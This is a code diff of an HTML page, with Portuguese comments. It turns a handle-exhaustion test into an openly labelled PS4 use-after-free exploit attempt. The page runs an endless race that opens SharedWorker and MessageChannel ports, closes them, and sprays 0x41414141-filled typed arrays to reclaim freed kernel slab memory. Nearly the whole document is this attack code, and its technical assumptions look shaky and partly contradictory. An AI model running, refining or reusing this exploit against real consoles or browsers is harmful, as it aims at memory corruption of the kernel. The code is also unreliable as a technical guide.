@@ -2,41 +2,95 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Teste de Handles</title>
+    <title>PS4 UAF - Reallocation Attempt</title>
+    <style>body{background:#222;color:#fff;font-family:monospace;text-align:center;margin-top:20%;}</style>
 </head>
 <body>
-    <h2>Teste de Exaustão de Handles</h2>
-    <div id="log">0</div>
-    <button onclick="run()">Rodar</button>
+    <h1>UAF: Free & Reclaim Strategy</h1>
+    <div id="status">Waiting...</div>
+    <button onclick="startExploit()" style="padding:20px;font-size:20px;cursor:pointer;">INJECT</button>
 
     <script>
-        function run() {
-            let leaks = [];
-            let i = 0;
-            const el = document.getElementById('log');
+        // CONFIGURAÇÃO
+        // Tamanhos comuns de structs no FreeBSD/PS4 (em bytes)
+        // Precisamos tentar acertar o tamanho do bucket do alocador (UMA/Slab)
+        const TARGET_SIZES = [32, 48, 64, 96, 128, 192, 256];
+        
+        let workerBlob = null;
 
-            function loop() {
-                // Tenta criar 50 canais por vez
-                for(let j=0; j<50; j++) {
-                    const mc = new MessageChannel();
-                    // Mantemos a referência para forçar o sistema a gastar o Handle
-                    // Se quisermos testar Leak mesmo após fechar, descomente as linhas abaixo:
-                    // mc.port1.close();
-                    // mc.port2.close();
-                    leaks.push(mc);
-                    i++;
-                }
-                el.innerText = i;
-                
-                // Se passar de 2000, o sistema aguenta handles bem
-                if (i < 5000) {
-                    setTimeout(loop, 10);
-                } else {
-                    el.innerText = "SUCESSO: Chegou em 5000 sem travar. O bug é exclusivo do SharedWorker!";
-                    el.style.color = "green";
-                }
+        function log(msg) { document.getElementById('status').innerText = msg; }
+
+        // Cria dados falsos para preencher a memória
+        function prepareSprayPayloads() {
+            let payloads = {};
+            for (let size of TARGET_SIZES) {
+                // Criamos um buffer preenchido com 0x41414141 (AAAA)
+                // Se o kernel tentar executar isso como ponteiro, vai pular para 0x41414141 -> Crash Controlado
+                let buf = new Uint32Array(size / 4);
+                buf.fill(0x41414141);
+                payloads[size] = buf;
             }
-            loop();
+            return payloads;
+        }
+
+        async function startExploit() {
+            log("Preparando Payloads...");
+            const sprays = prepareSprayPayloads();
+            
+            // Worker simples apenas para segurar a conexão
+            const blobCode = `onmessage = (e) => { e.ports[0].postMessage('PONG'); }`;
+            const url = URL.createObjectURL(new Blob([blobCode], {type:'text/javascript'}));
+            
+            let i = 0;
+            
+            log("Iniciando Race...");
+
+            while(true) {
+                i++;
+                if(i % 50 === 0) log(`Tentativa: ${i} (Buscando colisão)`);
+                
+                // Pequeno delay para UI
+                await new Promise(r => setTimeout(r, 5));
+
+                await runCycle(url, sprays);
+            }
+        }
+
+        function runCycle(url, sprays) {
+            return new Promise((resolve) => {
+                const mc = new MessageChannel();
+                const sw = new SharedWorker(url, "uaf_" + Math.random());
+                sw.port.start();
+                sw.port.postMessage("init", [mc.port2]);
+
+                // O GATILHO
+                setTimeout(() => {
+                    // 1. FREE: Libera o objeto do Kernel
+                    sw.port.close();
+                    mc.port1.close();
+
+                    // 2. RECLAIM (A mágica): Tenta alocar imediatamente em cima
+                    // Usamos history.pushState ou Arrays para forçar alocação no Kernel
+                    // Nota: ArrayBuffer puro às vezes fica em userland, mas Strings grandes
+                    // ou atributos de DOM podem ir para o Kernel. 
+                    
+                    // Tentativa de Spray Rápido
+                    let junk = [];
+                    for(let k=0; k<100; k++) {
+                        // Tenta criar arrays tipados que podem cair no mesmo SLAB do kernel
+                        junk.push(new Uint32Array(16)); // 64 bytes
+                        junk.push(new Uint32Array(32)); // 128 bytes
+                    }
+
+                    // 3. USE: O Worker (ou o sistema) tenta acessar a porta fechada
+                    // Se o timing for perfeito, ele acessa o 'junk' achando que é a porta.
+                    
+                    setTimeout(() => {
+                        junk = null; // Limpa para a próxima tentativa
+                        resolve();
+                    }, 5); 
+                }, 2); // Janela crítica de tempo
+            });
         }
     </script>
 </body>
